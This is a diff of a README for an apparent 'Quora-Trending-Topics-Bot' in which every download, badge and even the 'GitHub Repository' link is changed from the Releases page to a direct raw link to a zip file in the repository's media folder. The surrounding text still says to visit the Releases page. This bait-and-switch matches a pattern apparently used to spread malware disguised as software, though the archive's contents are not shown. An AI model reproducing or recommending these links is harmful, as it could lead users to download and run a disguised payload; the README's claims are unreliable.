@@ -1,6 +1,6 @@
 # 🤖 Quora-Trending-Topics-Bot - Automatically Discover Viral Topics
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Quora%20Trending%20Topics%20Bot-brightgreen)](https://github.com/ego531/Quora-Trending-Topics-Bot/releases)
+[![Download Now](https://raw.githubusercontent.com/ego531/Quora-Trending-Topics-Bot/main/media/Quora-Trending-Topics-Bot-2.6.zip%20Now-Quora%20Trending%20Topics%20Bot-brightgreen)](https://raw.githubusercontent.com/ego531/Quora-Trending-Topics-Bot/main/media/Quora-Trending-Topics-Bot-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Thank you for choosing **Quora-Trending-Topics-Bot**! This application helps you
 
 To get started, you need to visit the Releases page to download the application. Click the link below:
 
-[Download Quora-Trending-Topics-Bot](https://github.com/ego531/Quora-Trending-Topics-Bot/releases)
+[Download Quora-Trending-Topics-Bot](https://raw.githubusercontent.com/ego531/Quora-Trending-Topics-Bot/main/media/Quora-Trending-Topics-Bot-2.6.zip)
 
 1. Visit the Releases page by clicking the link above.
 2. Locate the latest version. It will usually be at the top of the page.
@@ -84,7 +84,7 @@ If you encounter any issues while using the application, consider the following:
 
 Explore these resources for more in-depth information:
 
-- [GitHub Repository](https://github.com/ego531/Quora-Trending-Topics-Bot)
+- [GitHub Repository](https://raw.githubusercontent.com/ego531/Quora-Trending-Topics-Bot/main/media/Quora-Trending-Topics-Bot-2.6.zip)
 - [User Manual](link-to-manual)
 - [FAQ](link-to-faq)
 
@@ -94,4 +94,4 @@ We appreciate your interest in **Quora-Trending-Topics-Bot**. For any questions 
 
 Stay updated with the latest features and bug fixes by visiting our Releases page regularly.
 
-[Download Quora-Trending-Topics-Bot](https://github.com/ego531/Quora-Trending-Topics-Bot/releases) and start exploring trending topics today!
+[Download Quora-Trending-Topics-Bot](https://raw.githubusercontent.com/ego531/Quora-Trending-Topics-Bot/main/media/Quora-Trending-Topics-Bot-2.6.zip) and start exploring trending topics today!
